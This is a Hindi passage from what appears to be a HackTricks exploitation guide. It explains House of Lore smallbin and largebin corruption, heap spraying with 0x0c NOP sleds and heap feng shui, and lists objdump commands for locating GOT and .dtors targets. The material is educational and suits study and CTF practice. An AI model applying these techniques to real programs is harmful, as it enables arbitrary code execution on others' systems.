यह जानना महत्वपूर्ण है कि नए वाइल्डरनेस टुकड़े का आकार पिछले malloc() द्वारा किए गए अनुरोध से बड़ा होना चाहिए। अर्थात्, यदि वाइल्डरनेस \&EIP-8 की ओर इशारा कर रहा है, तो आकार स्टैक के EBP क्षेत्र में ठीक रहेगा।

**The House of Lore**

**SmallBin का भ्रष्टाचार**

मुक्त किए गए टुकड़े उनके आकार के आधार पर बिन में डाले जाते हैं। लेकिन उन्हें डालने से पहले unsorted bins में रखा जाता है। एक टुकड़ा मुक्त किया जाता है, इसे तुरंत अपने बिन में नहीं डाला जाता है बल्कि यह unsorted bins में रहता है। इसके बाद, यदि एक नया टुकड़ा आरक्षित किया जाता है और पिछले मुक्त किए गए टुकड़े का उपयोग किया जा सकता है, तो इसे वापस कर दिया जाता है, लेकिन यदि एक बड़ा टुकड़ा आरक्षित किया जाता है, तो unsorted bins में मुक्त किया गया टुकड़ा उसके उचित बिन में डाल दिया जाता है।

संवेदनशील कोड तक पहुँचने के लिए मेमोरी अनुरोध av->max_fast (72 सामान्यतः) से बड़ा और MIN_LARGE_SIZE (512) से छोटा होना चाहिए।

यदि बिन में उस अनुरोध के लिए उपयुक्त आकार का एक टुकड़ा है, तो इसे अनलिंक करने के बाद वापस कर दिया जाएगा:

bck = victim->bk; पिछले टुकड़े की ओर इशारा करता है, यह एकमात्र जानकारी है जिसे हम संशोधित कर सकते हैं।

bin->bk = bck; पूर्व अंतिम टुकड़ा अंतिम बन जाता है, यदि bck स्टैक की ओर इशारा करता है, तो अगले आरक्षित टुकड़े को यह पता दिया जाएगा।

bck->fd = bin; यह सूची को बंद करता है ताकि यह बिन की ओर इशारा करे।

आवश्यक है:

दो malloc आरक्षित करना, ताकि पहले को ओवरफ्लो किया जा सके, इसके बाद दूसरे को मुक्त किया गया हो और इसे उसके बिन में डाला गया हो (अर्थात, ओवरफ्लो करने से पहले दूसरे टुकड़े से बड़ा malloc आरक्षित किया गया हो)।

जिस malloc को हमलावर द्वारा चुने गए पते को दिया जाता है, वह हमलावर द्वारा नियंत्रित होना चाहिए।

लक्ष्य यह है कि यदि हम एक हीप पर ओवरफ्लो कर सकते हैं जिसमें नीचे एक पहले से मुक्त किया गया टुकड़ा है और यह उसके बिन में है, तो हम इसके bk पॉइंटर को संशोधित कर सकते हैं। यदि हम इसके bk पॉइंटर को संशोधित करते हैं और यह टुकड़ा बिन की सूची का पहला बन जाता है और इसे आरक्षित किया जाता है, तो बिन को यह बताया जाएगा कि सूची का अंतिम टुकड़ा (अगला जो पेश किया जाएगा) उस झूठे पते पर है जिसे हमने रखा है (स्टैक या GOT के रूप में)। इसलिए यदि एक और टुकड़ा फिर से आरक्षित किया जाता है और हमलावर को उस पर अनुमति है, तो उसे इच्छित स्थिति में एक टुकड़ा दिया जाएगा और वह उस पर लिख सकेगा।

संशोधित टुकड़े को मुक्त करने के बाद, यह आवश्यक है कि एक टुकड़ा मुक्त किए गए टुकड़े से बड़ा हो, ताकि संशोधित टुकड़ा unsorted bins से बाहर निकल जाए और अपने बिन में डाल दिया जाए।

एक बार जब यह अपने बिन में होता है, तो यह ओवरफ्लो के माध्यम से bk पॉइंटर को संशोधित करने का समय होता है ताकि यह उस पते की ओर इशारा करे जिसे हम ओवरराइट करना चाहते हैं।

इस प्रकार, बिन को पर्याप्त बार malloc() को कॉल करने की प्रतीक्षा करनी होगी ताकि संशोधित बिन का पुनः उपयोग किया जा सके और बिन को यह विश्वास दिलाया जा सके कि अगला टुकड़ा झूठे पते पर है। और फिर हमें वह टुकड़ा दिया जाएगा जो हमें दिलचस्पी है।

संवेदनशीलता को यथाशीघ्र निष्पादित करने के लिए, आदर्श रूप से: संवेदनशील टुकड़े का आरक्षण, संशोधित टुकड़े का आरक्षण, इस टुकड़े को मुक्त करना, एक बड़े टुकड़े का आरक्षण जिसे संशोधित किया जाएगा, टुकड़े को संशोधित करना (संवेदनशीलता), संवेदनशील टुकड़े के समान आकार का एक टुकड़ा आरक्षित करना और एक समान आकार का दूसरा टुकड़ा आरक्षित करना होगा, और यह वह होगा जो चुने गए पते की ओर इशारा करेगा।

इस हमले की रक्षा के लिए, यह सामान्य जांच का उपयोग किया गया कि टुकड़ा “झूठा” नहीं है: यह जांचता है कि क्या bck->fd victim की ओर इशारा कर रहा है। अर्थात्, हमारे मामले में यदि झूठे टुकड़े का fd* पॉइंटर स्टैक में victim की ओर इशारा कर रहा है। इस सुरक्षा को बायपास करने के लिए, हमलावर को किसी न किसी तरह (संभवतः स्टैक के माध्यम से) सही पते पर victim का पता लिखने में सक्षम होना चाहिए। ताकि यह एक वास्तविक टुकड़ा प्रतीत हो।

**LargeBin का भ्रष्टाचार**

पहले की तरह ही आवश्यकताएँ हैं और कुछ और, इसके अलावा, आरक्षित टुकड़े 512 से बड़े होने चाहिए।

हमला पिछले जैसा ही है, अर्थात्, bk पॉइंटर को संशोधित करना आवश्यक है और सभी malloc() कॉल की आवश्यकता है, लेकिन इसके अलावा, संशोधित टुकड़े के आकार को इस प्रकार संशोधित करना होगा कि वह size - nb < MINSIZE हो।

उदाहरण के लिए, size को 1552 में डालने से 1552 - 1544 = 8 < MINSIZE होगा (घटाव नकारात्मक नहीं हो सकता क्योंकि unsigned की तुलना की जाती है)।

इसके अलावा, इसे और अधिक जटिल बनाने के लिए एक पैच लागू किया गया है।

**हीप स्प्रेइंग**

यह मूल रूप से सभी संभव मेमोरी को आरक्षित करने और इसे शेलकोड के साथ समाप्त नोप्स के गद्दे से भरने में शामिल है। इसके अलावा, गद्दे के रूप में 0x0c का उपयोग किया जाता है। क्योंकि यह 0x0c0c0c0c के पते पर कूदने का प्रयास करेगा, और इस प्रकार यदि किसी पते को ओवरराइट किया जाता है जिसे कॉल किया जाएगा, तो यह वहां कूद जाएगा। मूल रूप से रणनीति यह है कि अधिकतम संभव आरक्षित करें ताकि यह देखा जा सके कि क्या कोई पॉइंटर ओवरराइट किया गया है और 0x0c0c0c0c पर कूदें, यह उम्मीद करते हुए कि वहां नोप्स हैं।

**हीप फेंग शुई**

यह आरक्षण और मुक्तियों के माध्यम से मेमोरी को इस तरह से बिछाने में शामिल है कि मुक्त टुकड़ों के बीच आरक्षित टुकड़े हों। ओवरफ्लो करने वाला बफर एक अंडे में स्थित होगा।

**objdump -d ejecutable** —> फ़ंक्शंस को डिसएस\
**objdump -d ./PROGRAMA | grep FUNCION** —> फ़ंक्शन का पता प्राप्त करें\
**objdump -d -Mintel ./shellcodeout** —> यह देखने के लिए कि यह वास्तव में हमारी शेलकोड है और ऑपकोड निकालें\
**objdump -t ./exec | grep varBss** —> प्रतीक तालिका, वेरिएबल और फ़ंक्शंस के पते निकालने के लिए\
**objdump -TR ./exec | grep exit(func lib)** —> पुस्तकालय फ़ंक्शंस के पते निकालने के लिए (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> GOT में ओवरराइट करने के लिए puts का पता निकालें\
**objdump -D ./exec** —> सभी को डिसएस करें जब तक कि plt के प्रवेश न हों\
**objdump -p -/exec**\
**Info functions strncmp —>** gdb में फ़ंक्शन की जानकारी

## दिलचस्प पाठ्यक्रम

- [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
- [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
- [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **संदर्भ**

- [**https://guyinatuxedo.github.io/7.2-mitigation_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation_relro/index.html)

{{#include ../../banners/hacktricks-training.md}}
